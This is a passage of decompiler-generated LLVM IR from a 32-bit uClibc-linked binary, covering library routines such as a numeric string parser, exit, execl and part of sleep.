  br i1 %v4_10010518, label %dec_label_pc_10010524, label %dec_label_pc_10010518.dec_label_pc_10010560_crit_edge

dec_label_pc_10010518.dec_label_pc_10010560_crit_edge: ; preds = %dec_label_pc_10010518
  %v0_10010560.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010560

dec_label_pc_10010524:                            ; preds = %dec_label_pc_10010518
  %v0_10010524 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010524 = inttoptr i32 %v0_10010524 to i8*
  %v2_10010524 = load i8, i8* %v1_10010524, align 1
  %v0_10010528 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010528 = add i32 %v0_10010528, 10
  store i32 %v1_10010528, i32* %r30.global-to-local, align 4
  %v3_1001052c = icmp eq i8 %v2_10010524, 48
  br i1 %v3_1001052c, label %dec_label_pc_10010534, label %dec_label_pc_10010554

dec_label_pc_10010534:                            ; preds = %dec_label_pc_10010524
  %v1_10010534 = add i32 %v0_10010524, 1
  %v2_10010534 = inttoptr i32 %v1_10010534 to i8*
  %v3_10010534 = load i8, i8* %v2_10010534, align 1
  %v4_10010534 = zext i8 %v3_10010534 to i32
  store i32 %v1_10010534, i32* %r31.global-to-local, align 4
  %v1_10010538 = add i32 %v0_10010528, 8
  store i32 %v1_10010538, i32* %r30.global-to-local, align 4
  %v1_1001053c = or i32 %v4_10010534, 32
  %v3_10010544 = icmp eq i32 %v1_1001053c, 120
  br i1 %v3_10010544, label %dec_label_pc_1001054c, label %dec_label_pc_10010554

dec_label_pc_1001054c:                            ; preds = %dec_label_pc_10010534
  %v1_1001054c = mul i32 %v1_10010538, 2
  store i32 %v1_1001054c, i32* %r30.global-to-local, align 4
  %v1_10010550 = add i32 %v0_10010524, 2
  store i32 %v1_10010550, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010554

dec_label_pc_10010554:                            ; preds = %dec_label_pc_10010534, %dec_label_pc_10010524, %dec_label_pc_1001054c
  %v0_1001060815 = phi i32 [ %v1_10010534, %dec_label_pc_1001054c ], [ %tmp, %dec_label_pc_10010524 ], [ %v1_10010534, %dec_label_pc_10010534 ]
  %v0_10010554 = phi i32 [ %v1_1001054c, %dec_label_pc_1001054c ], [ %v1_10010528, %dec_label_pc_10010524 ], [ %v1_10010538, %dec_label_pc_10010534 ]
  %tmp22 = icmp slt i32 %v0_10010554, 17
  br i1 %tmp22, label %dec_label_pc_10010560, label %dec_label_pc_1001055c

dec_label_pc_1001055c:                            ; preds = %dec_label_pc_10010554
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010560

dec_label_pc_10010560:                            ; preds = %dec_label_pc_10010518.dec_label_pc_10010560_crit_edge, %dec_label_pc_10010554, %dec_label_pc_1001055c
  %v0_1001060814 = phi i32 [ %tmp, %dec_label_pc_10010518.dec_label_pc_10010560_crit_edge ], [ %v0_1001060815, %dec_label_pc_10010554 ], [ %v0_1001060815, %dec_label_pc_1001055c ]
  %v1_10010574 = phi i32 [ %v0_10010560.pre, %dec_label_pc_10010518.dec_label_pc_10010560_crit_edge ], [ %v0_10010554, %dec_label_pc_10010554 ], [ 16, %dec_label_pc_1001055c ]
  %v1_10010560 = add i32 %v1_10010574, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10010568 = icmp ugt i32 %v1_10010560, 34
  br i1 %v2_10010568, label %dec_label_pc_10010600, label %dec_label_pc_10010570

dec_label_pc_10010570:                            ; preds = %dec_label_pc_10010560
  %v2_10010574 = udiv i32 -1, %v1_10010574
  store i32 %v2_10010574, i32* @r29, align 4
  %v2_10010578 = mul i32 %v2_10010574, %v1_10010574
  %v1_1001057c = sub i32 -1, %v2_10010578
  %v1_10010580 = urem i32 %v1_1001057c, 256
  store i32 %v1_10010580, i32* @r27, align 4
  %v0_1001058c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001058c

dec_label_pc_10010588:                            ; preds = %dec_label_pc_100105f4, %dec_label_pc_100105dc
  %v1_10010590.pre = phi i32 [ %v1_10010594, %dec_label_pc_100105f4 ], [ %v1_10010590.pre.pre, %dec_label_pc_100105dc ]
  %v0_10010590.pre = phi i32 [ %v2_100105f8, %dec_label_pc_100105f4 ], [ %v0_10010590.pre.pre, %dec_label_pc_100105dc ]
  %v0_10010588 = phi i32 [ %v1_10010598, %dec_label_pc_100105f4 ], [ %v0_10010588.pre, %dec_label_pc_100105dc ]
  br label %dec_label_pc_1001058c

dec_label_pc_1001058c:                            ; preds = %dec_label_pc_10010570, %dec_label_pc_10010588
  %v0_1001060812 = phi i32 [ %v0_1001060814, %dec_label_pc_10010570 ], [ %v0_10010588, %dec_label_pc_10010588 ]
  %v0_10010598 = phi i32 [ %v0_1001058c.pre, %dec_label_pc_10010570 ], [ %v0_10010588, %dec_label_pc_10010588 ]
  %v1_10010594 = phi i32 [ %v2_10010574, %dec_label_pc_10010570 ], [ %v1_10010590.pre, %dec_label_pc_10010588 ]
  %v0_100105f4 = phi i32 [ 0, %dec_label_pc_10010570 ], [ %v0_10010590.pre, %dec_label_pc_10010588 ]
  %v1_1001058c = inttoptr i32 %v0_10010598 to i8*
  %v2_1001058c = load i8, i8* %v1_1001058c, align 1
  %v3_1001058c = zext i8 %v2_1001058c to i32
  %v3_10010590 = icmp ugt i32 %v0_100105f4, %v1_10010594
  %v1_10010598 = add i32 %v0_10010598, 1
  store i32 %v1_10010598, i32* %r31.global-to-local, align 4
  %v1_1001059c = add nsw i32 %v3_1001058c, -48
  %v1_100105a0 = or i32 %v3_1001058c, 32
  %v1_100105a4 = urem i32 %v1_1001059c, 256
  %tmp23 = icmp ult i32 %v1_100105a4, 10
  br i1 %tmp23, label %dec_label_pc_100105c4, label %dec_label_pc_100105b4

dec_label_pc_100105b4:                            ; preds = %dec_label_pc_1001058c
  %tmp24 = icmp ult i32 %v1_100105a0, 97
  br i1 %tmp24, label %dec_label_pc_100105c4, label %dec_label_pc_100105c0

dec_label_pc_100105c0:                            ; preds = %dec_label_pc_100105b4
  %v1_100105b4 = add nsw i32 %v1_100105a0, -87
  %v1_100105c0 = urem i32 %v1_100105b4, 256
  br label %dec_label_pc_100105c4

dec_label_pc_100105c4:                            ; preds = %dec_label_pc_100105b4, %dec_label_pc_1001058c, %dec_label_pc_100105c0
  %v1_100105f8 = phi i32 [ 40, %dec_label_pc_100105b4 ], [ %v1_100105a4, %dec_label_pc_1001058c ], [ %v1_100105c0, %dec_label_pc_100105c0 ]
  %v1_100105c4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100105c4 = icmp slt i32 %v1_100105f8, %v1_100105c4
  br i1 %v2_100105c4, label %dec_label_pc_100105cc, label %dec_label_pc_10010600

dec_label_pc_100105cc:                            ; preds = %dec_label_pc_100105c4
  br i1 %v3_10010590, label %dec_label_pc_100105dc, label %dec_label_pc_100105d0

dec_label_pc_100105d0:                            ; preds = %dec_label_pc_100105cc
  %v1_100105d0 = load i32, i32* @r27, align 4
  %v0_100105d4.not = icmp ne i32 %v0_100105f4, %v1_10010594
  %tmp25 = icmp ule i32 %v1_100105f8, %v1_100105d0
  %or.cond = or i1 %tmp25, %v0_100105d4.not
  br i1 %or.cond, label %dec_label_pc_100105f4, label %dec_label_pc_100105dc

dec_label_pc_100105dc:                            ; preds = %dec_label_pc_100105d0, %dec_label_pc_100105cc
  %v0_100105dc = call i32 @__errno_location()
  %v0_100105e0 = load i32, i32* @r28, align 4
  %v1_100105e0 = load i32, i32* @r26, align 4
  %v2_100105e0 = and i32 %v1_100105e0, %v0_100105e0
  store i32 %v2_100105e0, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_100105ec = inttoptr i32 %v0_100105dc to i32*
  store i32 34, i32* %v2_100105ec, align 4
  %v0_10010588.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10010590.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10010590.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010588

dec_label_pc_100105f4:                            ; preds = %dec_label_pc_100105d0
  %v2_100105f4 = mul i32 %v1_100105c4, %v0_100105f4
  %v2_100105f8 = add i32 %v2_100105f4, %v1_100105f8
  store i32 %v2_100105f8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010588

dec_label_pc_10010600:                            ; preds = %dec_label_pc_100105c4, %dec_label_pc_10010560
  %v0_10010608 = phi i32 [ %v0_1001060814, %dec_label_pc_10010560 ], [ %v0_1001060812, %dec_label_pc_100105c4 ]
  %v0_10010600 = load i32, i32* @r25, align 4
  %v3_10010600 = icmp eq i32 %v0_10010600, 0
  br i1 %v3_10010600, label %dec_label_pc_1001060c, label %dec_label_pc_10010608

dec_label_pc_10010608:                            ; preds = %dec_label_pc_10010600
  %v2_10010608 = inttoptr i32 %v0_10010600 to i32*
  store i32 %v0_10010608, i32* %v2_10010608, align 4
  br label %dec_label_pc_1001060c

dec_label_pc_1001060c:                            ; preds = %dec_label_pc_10010600, %dec_label_pc_10010608
  %v0_1001060c = load i32, i32* @r26, align 4
  %v3_1001060c = icmp eq i32 %v0_1001060c, 0
  %v0_10010610 = load i32, i32* @r28, align 4
  %v1_10010610 = sub i32 0, %v0_10010610
  %tmp27 = lshr i32 %v1_10010610, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10010650.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1001060c, label %dec_label_pc_10010640, label %dec_label_pc_10010628

dec_label_pc_10010628:                            ; preds = %dec_label_pc_1001060c
  %v3_10010628 = icmp ugt i32 %v0_10010650.pre.pre, %tmp28
  br i1 %v3_10010628, label %dec_label_pc_10010630, label %dec_label_pc_10010640

dec_label_pc_10010630:                            ; preds = %dec_label_pc_10010628
  %v0_10010630 = call i32 @__errno_location()
  %v2_10010638 = inttoptr i32 %v0_10010630 to i32*
  store i32 34, i32* %v2_10010638, align 4
  %v0_1001063c = load i32, i32* @r31, align 4
  store i32 %v0_1001063c, i32* %r8.global-to-local, align 4
  %v0_10010640.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10010640

dec_label_pc_10010640:                            ; preds = %dec_label_pc_1001060c, %dec_label_pc_10010628, %dec_label_pc_10010630
  %v0_10010650.pre = phi i32 [ %v0_10010650.pre.pre, %dec_label_pc_10010628 ], [ %v0_1001063c, %dec_label_pc_10010630 ], [ %v0_10010650.pre.pre, %dec_label_pc_1001060c ]
  %v0_10010640 = phi i32 [ %v0_10010610, %dec_label_pc_10010628 ], [ %v0_10010640.pre, %dec_label_pc_10010630 ], [ %v0_10010610, %dec_label_pc_1001060c ]
  %v3_10010640 = icmp eq i32 %v0_10010640, 0
  br i1 %v3_10010640, label %dec_label_pc_1001064c, label %dec_label_pc_10010648

dec_label_pc_10010648:                            ; preds = %dec_label_pc_10010640
  %v1_10010648 = sub i32 0, %v0_10010650.pre
  store i32 %v1_10010648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001064c

dec_label_pc_1001064c:                            ; preds = %dec_label_pc_10010640, %dec_label_pc_10010648
  %v0_10010650 = phi i32 [ %v1_10010648, %dec_label_pc_10010648 ], [ %v0_10010650.pre, %dec_label_pc_10010640 ]
  ret i32 %v0_10010650

; uselistorder directives
  uselistorder i32 %v0_10010650.pre, { 1, 0 }
  uselistorder i32 %v0_10010650.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_100105f8, { 1, 0 }
  uselistorder i32 %v1_100105a4, { 1, 0 }
  uselistorder i32 %v1_100105a0, { 1, 0 }
  uselistorder i32 %v1_10010598, { 1, 0 }
  uselistorder i32 %v3_1001058c, { 1, 0 }
  uselistorder i32 %v0_100105f4, { 1, 0, 2 }
  uselistorder i32 %v1_10010594, { 0, 2, 1 }
  uselistorder i32 %v0_10010588, { 1, 0 }
  uselistorder i32 %v2_10010574, { 1, 0, 2 }
  uselistorder i32 %v1_1001054c, { 1, 0 }
  uselistorder i32 %v1_10010538, { 1, 0, 2 }
  uselistorder i32 %v0_10010514, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder label %dec_label_pc_1001064c, { 1, 0 }
  uselistorder label %dec_label_pc_10010640, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001060c, { 1, 0 }
  uselistorder label %dec_label_pc_100105c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001058c, { 1, 0 }
  uselistorder label %dec_label_pc_10010560, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010554, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010518, { 1, 0 }
  uselistorder label %dec_label_pc_10010514, { 1, 0 }
  uselistorder label %dec_label_pc_100104e0, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001067c = ptrtoint i32* %stack_var_-40 to i32
  %v0_10010688 = load i32, i32* @r3, align 4
  store i32 %v0_10010688, i32* @r31, align 4
  store i32 %v2_1001067c, i32* @r3, align 4
  %v0_10010694 = call i32 @__pthread_return_void()
  %v0_1001069c = call i32 @__pthread_return_0()
  %v3_100106a4 = load i32, i32* @global_var_100285f4.657, align 4
  %v3_100106a8 = icmp eq i32 %v3_100106a4, 0
  br i1 %v3_100106a8, label %dec_label_pc_100106bc, label %dec_label_pc_100106b0

dec_label_pc_100106b0:                            ; preds = %entry
  %v0_100106b0 = load i32, i32* @r31, align 4
  %v3_100106b8 = call i32 @unknown_0(i32 %v0_100106b0, i32 268632064)
  br label %dec_label_pc_100106bc

dec_label_pc_100106bc:                            ; preds = %entry, %dec_label_pc_100106b0
  store i32 %v2_1001067c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_100106c4 = call i32 @__pthread_return_void()
  store i32 %v0_100106c4, i32* @r3, align 4
  store i32 268502732, i32* @lr, align 4
  %v1_100106c8 = call i32 @__GI___uClibc_fini(i32 %v0_100106c4)
  store i32 268502752, i32* @lr, align 4
  %v2_100106dc = call i32 @_stdio_term(i32 %v1_100106c8, i32 268488168)
  %v0_100106e0 = load i32, i32* @r31, align 4
  %v1_100106e4 = call i32 @__GI__exit(i32 %v0_100106e0)
  ret i32 %v1_100106e4

; uselistorder directives
  uselistorder label %dec_label_pc_100106bc, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100106e8 = ptrtoint i32* %stack_var_0 to i32
  %v2_10010704 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10010704, i32* %r0.global-to-local, align 4
  %v2_1001070c = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_10010704, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010738

dec_label_pc_10010738:                            ; preds = %dec_label_pc_10010768, %entry
  %v0_1001073c = phi i32 [ 0, %entry ], [ %v1_1001073c, %dec_label_pc_10010768 ]
  %stack_var_-52.0 = phi i32 [ %v2_1001070c, %entry ], [ %stack_var_-52.1, %dec_label_pc_10010768 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_10010768 ]
  %v4_10010738 = zext i8 %stack_var_-56.0 to i32
  %v1_1001073c = add i32 %v0_1001073c, 1
  %v1_10010744 = mul nuw nsw i32 %v4_10010738, 4
  store i32 %v1_10010744, i32* %r0.global-to-local, align 4
  %v2_10010748 = add i32 %v1_10010744, %v2_10010704
  store i32 %v2_10010748, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1001075c, label %dec_label_pc_10010754

dec_label_pc_10010754:                            ; preds = %dec_label_pc_10010738
  %v1_1001074c = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10010768

dec_label_pc_1001075c:                            ; preds = %dec_label_pc_10010738
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10010760 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10010760, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_10010754, %dec_label_pc_1001075c
  %stack_var_-52.1 = phi i32 [ %v1_10010760, %dec_label_pc_1001075c ], [ %stack_var_-52.0, %dec_label_pc_10010754 ]
  %v0_10010768 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1001075c ], [ %v2_10010748, %dec_label_pc_10010754 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1001075c ], [ %v1_1001074c, %dec_label_pc_10010754 ]
  %v1_10010768 = inttoptr i32 %v0_10010768 to i32*
  %v2_10010768 = load i32, i32* %v1_10010768, align 4
  store i32 %v2_10010768, i32* %r0.global-to-local, align 4
  %v3_1001076c = icmp eq i32 %v2_10010768, 0
  br i1 %v3_1001076c, label %dec_label_pc_10010774, label %dec_label_pc_10010738

dec_label_pc_10010774:                            ; preds = %dec_label_pc_10010768
  %v1_10010774 = mul i32 %v1_1001073c, 4
  store i32 %v4_100106e8, i32* %r0.global-to-local, align 4
  %v1_1001077c = add i32 %v1_10010774, 34
  store i32 %v1_1001073c, i32* %ctr.global-to-local, align 4
  %v1_10010784 = call i32 @__asm_rlwinm(i32 %v1_1001077c, i32 0, i32 0, i32 27)
  %v1_1001078c = load i32, i32* @r1, align 4
  %v3_1001078c = sub i32 %v1_1001078c, %v1_10010784
  %v4_1001078c = inttoptr i32 %v3_1001078c to i32*
  store i32 %v4_100106e8, i32* %v4_1001078c, align 4
  %v1_10010790 = add i32 %v3_1001078c, 23
  store i32 %v1_10010790, i32* %r0.global-to-local, align 4
  %v1_10010794 = call i32 @__asm_rlwinm(i32 %v1_10010790, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001079c = load i32, i32* %r8.global-to-local, align 4
  %v2_1001079c = inttoptr i32 %v1_10010794 to i32*
  store i32 %v0_1001079c, i32* %v2_1001079c, align 4
  store i32 %v1_10010794, i32* %r11.global-to-local, align 4
  %v0_100107a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100107a4 = trunc i32 %v0_100107a4 to i8
  store i32 %v2_10010704, i32* %r0.global-to-local, align 4
  store i32 %v2_10010704, i32* %stack_var_-48, align 4
  br label %dec_label_pc_100107b8

dec_label_pc_100107b8:                            ; preds = %dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge, %dec_label_pc_10010774
  %v0_100107bc = phi i32 [ %v1_10010794, %dec_label_pc_10010774 ], [ %v0_100107bc.pre, %dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1001070c, %dec_label_pc_10010774 ], [ %stack_var_-52.3, %dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_100107a4, %dec_label_pc_10010774 ], [ %stack_var_-56.3, %dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge ]
  %v1_100107bc = add i32 %v0_100107bc, 4
  store i32 %v1_100107bc, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_100107e0, label %dec_label_pc_100107d0

dec_label_pc_100107d0:                            ; preds = %dec_label_pc_100107b8
  %v4_100107b8 = zext i8 %stack_var_-56.2 to i32
  %v1_100107c8 = add i8 %stack_var_-56.2, 1
  %v1_100107c4 = mul nuw nsw i32 %v4_100107b8, 4
  %v3_100107d0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_100107d0, i32* %r0.global-to-local, align 4
  %v2_100107d8 = add i32 %v3_100107d0, %v1_100107c4
  br label %dec_label_pc_100107ec

dec_label_pc_100107e0:                            ; preds = %dec_label_pc_100107b8
  %v1_100107e4 = add i32 %stack_var_-52.2, 4
  store i32 %v1_100107e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100107ec

dec_label_pc_100107ec:                            ; preds = %dec_label_pc_100107d0, %dec_label_pc_100107e0
  %stack_var_-52.3 = phi i32 [ %v1_100107e4, %dec_label_pc_100107e0 ], [ %stack_var_-52.2, %dec_label_pc_100107d0 ]
  %v0_100107ec = phi i32 [ %stack_var_-52.2, %dec_label_pc_100107e0 ], [ %v2_100107d8, %dec_label_pc_100107d0 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_100107e0 ], [ %v1_100107c8, %dec_label_pc_100107d0 ]
  %v1_100107ec = inttoptr i32 %v0_100107ec to i32*
  %v2_100107ec = load i32, i32* %v1_100107ec, align 4
  store i32 %v2_100107ec, i32* %r0.global-to-local, align 4
  %v2_100107f0 = inttoptr i32 %v1_100107bc to i32*
  store i32 %v2_100107ec, i32* %v2_100107f0, align 4
  %v0_100107f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100107f4 = add i32 %v0_100107f4, -1
  store i32 %v1_100107f4, i32* %ctr.global-to-local, align 4
  %v2_100107f4 = icmp eq i32 %v1_100107f4, 0
  br i1 %v2_100107f4, label %dec_label_pc_100107f8, label %dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge

dec_label_pc_100107ec.dec_label_pc_100107b8_crit_edge: ; preds = %dec_label_pc_100107ec
  %v0_100107bc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100107b8

dec_label_pc_100107f8:                            ; preds = %dec_label_pc_100107ec
  %v3_100107fc = load i32, i32* @global_var_100285fc.659, align 4
  store i32 268503044, i32* @lr, align 4
  %v2_10010800 = call i32 @__GI_execve(i32 %v3_100107fc, i32 268632064)
  %v0_10010804 = load i32, i32* @r1, align 4
  %v1_10010804 = inttoptr i32 %v0_10010804 to i32*
  %v2_10010804 = load i32, i32* %v1_10010804, align 4
  store i32 %v2_10010804, i32* %r11.global-to-local, align 4
  %v1_10010808 = add i32 %v2_10010804, 4
  %v2_10010808 = inttoptr i32 %v1_10010808 to i32*
  %v3_10010808 = load i32, i32* %v2_10010808, align 4
  store i32 %v3_10010808, i32* %r0.global-to-local, align 4
  ret i32 %v2_10010800

; uselistorder directives
  uselistorder i32 %v1_100107f4, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10010744, { 1, 0 }
  uselistorder i32 %v1_1001073c, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10010704, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8 1, { 0, 1, 11, 12, 2, 3, 13, 10, 14, 9, 8, 7, 6, 5, 4, 15 }
  uselistorder label %dec_label_pc_100107ec, { 1, 0 }
  uselistorder label %dec_label_pc_10010768, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1001081c = icmp eq i32 %arg1, 0
  br i1 %v3_1001081c, label %dec_label_pc_100109d0, label %dec_label_pc_1001084c.lr.ph

dec_label_pc_1001084c.lr.ph:                      ; preds = %entry
  %v2_10010840 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10010840, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001084c42 = add i32 %v2_10010840, 132
  %v3_1001084c43 = inttoptr i32 %v2_1001084c42 to i32*
  store i32 0, i32* %v3_1001084c43, align 4
  %v0_1001085044 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001085045 = add i32 %v0_1001085044, -1
  store i32 %v1_1001085045, i32* %r11.global-to-local, align 4
  %v1_1001085446 = mul i32 %v1_1001085045, 4
  %v1_1001085847 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001085848 = add i32 %v1_1001085847, %v1_1001085446
  %v0_1001085c49 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001085c50 = add i32 %v0_1001085c49, -1
  store i32 %v1_1001085c50, i32* %ctr.global-to-local, align 4
  %v2_1001085c51 = icmp eq i32 %v1_1001085c50, 0
  br i1 %v2_1001085c51, label %dec_label_pc_10010860, label %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge

dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge: ; preds = %dec_label_pc_1001084c.lr.ph, %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge
  %v2_1001085852 = phi i32 [ %v2_10010858, %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge ], [ %v2_1001085848, %dec_label_pc_1001084c.lr.ph ]
  %v0_1001084c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1001084c = add i32 %v2_1001085852, 8
  %v3_1001084c = inttoptr i32 %v2_1001084c to i32*
  store i32 %v0_1001084c.pre, i32* %v3_1001084c, align 4
  %v0_10010850 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010850 = add i32 %v0_10010850, -1
  store i32 %v1_10010850, i32* %r11.global-to-local, align 4
  %v1_10010854 = mul i32 %v1_10010850, 4
  %v1_10010858 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010858 = add i32 %v1_10010858, %v1_10010854
  %v0_1001085c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001085c = add i32 %v0_1001085c, -1
  store i32 %v1_1001085c, i32* %ctr.global-to-local, align 4
  %v2_1001085c = icmp eq i32 %v1_1001085c, 0
  br i1 %v2_1001085c, label %dec_label_pc_10010860, label %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge

dec_label_pc_10010860:                            ; preds = %dec_label_pc_1001084c.dec_label_pc_1001084c_crit_edge, %dec_label_pc_1001084c.lr.ph
  %v0_10010874.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10010860 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10010860, i32* %r29.global-to-local, align 4
  store i32 %v2_10010860, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_10010874.pre, i32* %stack_var_-440, align 4
  %v0_10010878 = call i32 @__sigaddset()
  store i32 %v0_10010878, i32* %r3.global-to-local, align 4
  %v1_1001087c = icmp slt i32 %v0_10010878, 0
  br i1 %v1_1001087c, label %dec_label_pc_100109d8, label %dec_label_pc_10010884

dec_label_pc_10010884:                            ; preds = %dec_label_pc_10010860
  %v2_10010884 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10010884, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268503192, i32* @lr, align 4
  %v3_10010894 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10010860, i32 %v2_10010884)
  store i32 %v3_10010894, i32* %r3.global-to-local, align 4
  %v3_10010898 = icmp eq i32 %v3_10010894, 0
  br i1 %v3_10010898, label %dec_label_pc_100108a0, label %dec_label_pc_100109d8

dec_label_pc_100108a0:                            ; preds = %dec_label_pc_10010884
  store i32 %v2_10010884, i32* %r3.global-to-local, align 4
  %v2_100108a8 = call i32 @__sigismember(i32 %v2_10010884, i32 17)
  store i32 %v2_100108a8, i32* %r3.global-to-local, align 4
  %v3_100108ac = icmp eq i32 %v2_100108a8, 0
  br i1 %v3_100108ac, label %dec_label_pc_100108cc.lr.ph, label %dec_label_pc_10010998

dec_label_pc_100108cc.lr.ph:                      ; preds = %dec_label_pc_100108a0
  store i32 %v2_10010840, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1001084c43, align 4
  %v0_100108d033 = load i32, i32* %r11.global-to-local, align 4
  %v1_100108d034 = add i32 %v0_100108d033, -1
  store i32 %v1_100108d034, i32* %r11.global-to-local, align 4
  %v1_100108d435 = mul i32 %v1_100108d034, 4
  %v1_100108d836 = load i32, i32* %r8.global-to-local, align 4
  %v2_100108d837 = add i32 %v1_100108d836, %v1_100108d435
  %v0_100108dc38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100108dc39 = add i32 %v0_100108dc38, -1
